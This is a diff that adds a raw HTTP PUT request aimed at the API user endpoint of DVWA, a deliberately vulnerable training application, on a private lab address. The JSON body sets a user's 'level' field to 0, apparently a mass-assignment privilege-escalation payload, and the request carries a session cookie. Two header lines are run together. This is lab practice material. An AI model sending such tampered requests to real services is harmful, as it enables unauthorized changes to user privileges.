@@ -1,0 +1,14 @@
+PUT /DVWA/vulnerabilities/api/v2/user/2 HTTP/1.1
+Host: 192.168.56.105
+Content-Length: 16
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: / Origin: http://192.168.56.105
+Referer: http://192.168.56.105/DVWA/vulnerabilities/api/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=229b8c33ef5730e8705c5b88a3629385; security=medium Connection: keep-alive
+{
+    "name":"morph",
+    "level":0
+}
